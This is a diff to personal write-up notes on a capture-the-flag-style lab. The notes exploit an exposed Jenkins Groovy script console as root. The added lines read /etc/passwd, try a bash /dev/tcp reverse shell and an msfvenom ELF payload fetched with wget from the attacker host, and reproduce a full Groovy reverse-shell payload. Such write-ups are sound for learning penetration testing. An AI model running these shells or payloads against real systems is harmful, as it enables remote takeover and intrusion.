@@ -86,21 +86,18 @@ I tried some arbitrary commands in the CLI:
   - The simplest way to invoke an external process in Groovy is to use the execute() command on a string. For example, to execute maven from a groovy script run this:
 ```
 "cmd /c mvn".execute()
-```
-  - If you want to capture the output of the command and maybe print it out, you can do this:
-```
+# if you want to capture the output of the command and maybe print it out, you can do this:
 print "cmd /c mvn".execute().text
+# the 'cmd /c' at the start invokes the Windows command shell. Since mvn.bat is a batch script you need this. For Unix you can invoke the system shell.
 ```
-  - The 'cmd /c' at the start invokes the Windows command shell. Since mvn.bat is a batch script you need this. For Unix you can invoke the system shell.
 
-
-
-- Some stuff I tried:
+### Some stuff I tried:
 ```
-"cat /etc/passwd ".execute().text   # that printed the /etc/passwd file
-"ifconfig".execute().text           # that showed me network info
-"which bash".execute().text         # result: /usr/bin/bash
-"bash --version".execute().text     # result: version 5.0.17(1)-release
+"cat /etc/passwd ".execute().text          # that printed the /etc/passwd file
+"ifconfig".execute().text                  # that showed me network info
+"which bash".execute().text                # result: /usr/bin/bash
+"bash --version".execute().text            # result: version 5.0.17(1)-release
+"ping -c 5 10.129.212.139".execute().text  # got all pings returned okay
 ```
 
 Therefore I can execute arbitrary system commands on the box as root. 
@@ -115,6 +112,40 @@ nc -nvlup 1234    # UDP listener
 
 ### Executed the Bash One-Liner: 
 ```
-/bin/bash -c 'bash -i &> /dev/tcp/10.129.212.139/1234 0>&1'
+/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.170/1234 0>&1'
+```
+Did not work. Tried the following and nothing worked: 
+```
+# on the local machine
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.170 LPORT=1234 -f elf > shell-x64.elf
+python3 -m http.server 80
+# on the remote machine
+"wget http://10.10.14.170/shell-x64.elf".execute().text
 ```
 
+The wget executed but I could not get the shell executable to run on the target.
+- Apparently in Groovy you need to create a cmd process that will execute the file.
+
+
+## Walkthrough
+- Jenkins exposures:
+  - [A handbook including multiple ways of gaining Jenkins RCE's](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)
+  - [A repository similar to the above, including links to scripts and tools](https://github.com/gquere/pwn_jenkins)
+
+Since it only executes the Groovy commands, we will need to create a payload in Groovy to execute the reverse shell connection.
+- In order to do that, we will need a specially crafted payload, which we can find in the following GitHub [cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+- He used the one here but cleaned it up a little by putting separate commands on each line (NOTE: you need to take out my #comments before running in Groovy).
+```
+String host="{your_IP}";    # Specify the IP address for the target to connect back to
+int port=1234;              # Specify the port on which the attacker will listen on
+String cmd="/bin/bash";     # Specify the shell type the attacker expects
+
+# The rest of the script will instruct the target to create a cmd process which will initialize a connection request to the provided host and port (us, in this case). 
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
+Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
+{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
+while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
+{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
